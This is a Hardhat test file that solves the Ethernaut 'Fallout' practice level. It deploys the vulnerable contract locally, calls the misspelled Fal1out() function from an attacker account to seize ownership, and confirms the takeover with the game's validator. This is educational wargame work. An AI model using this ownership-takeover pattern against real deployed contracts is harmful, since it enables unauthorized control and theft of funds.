import { expect } from "chai";
import { ethers } from "hardhat";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";

describe("Fallout exploit", () => {
  async function deployFalloutFixture() {
    const [deployer, attacker] = await ethers.getSigners();
    const FalloutFactory = await ethers.getContractFactory("FalloutFactory");
    const falloutFactory = await FalloutFactory.connect(deployer).deploy();

    // Simulate execution of createInstance to get return value of the function(address of deployed instance)
    const falloutAddress = await falloutFactory.callStatic.createInstance(attacker.address);

    const tx = await falloutFactory.createInstance(attacker.address);
    await tx.wait();

    // Load the instance at returned address
    const fallout = await ethers.getContractAt("Fallout", falloutAddress);

    return { attacker, fallout, falloutFactory };
  }

  it("Should set attacker account as new owner", async () => {
    const { attacker, fallout, falloutFactory } = await loadFixture(deployFalloutFixture);

    // Call Fal1out() function
    // this will set attacker as the new owner
    await fallout.connect(attacker).Fal1out();

    const newOwner = await fallout.connect(attacker).owner();
    expect(newOwner).to.equal(attacker.address, "New owner not set. Attack failed.");

    // Validate instance using Ethernaut validation
    const success = await falloutFactory.validateInstance(fallout.address, attacker.address);
    expect(success).to.be.true;
  });
});
